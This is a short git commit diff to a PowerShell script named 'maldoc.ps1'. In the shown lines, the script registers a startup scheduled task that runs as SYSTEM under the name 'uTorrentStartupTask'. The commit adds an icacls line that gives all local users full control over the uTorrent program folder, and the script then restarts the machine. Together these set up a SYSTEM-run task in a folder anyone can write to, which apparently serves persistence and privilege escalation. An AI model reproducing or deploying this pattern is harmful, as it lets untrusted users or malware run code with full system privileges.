d82f97a7a6bfcc1bebcdb789efd80984932b98ef
jovair1994 <68813860+jovair1994@users.noreply.github.com>
2024-01-03 10:56:04 -0300

    Update maldoc.ps1

--- maldoc.ps1
+++ maldoc.ps1
@@ -112,5 +112,7 @@ $trigger = New-ScheduledTaskTrigger -AtStartup
 
 Register-ScheduledTask -Action $acao -Trigger $trigger -TaskName "uTorrentStartupTask" -User "NT AUTHORITY\SYSTEM"
 
+icacls "C:\Program Files (x86)\uTorrent" /grant:r "Usuários:(OI)(CI)F" /t
+
 Restart-Computer
 
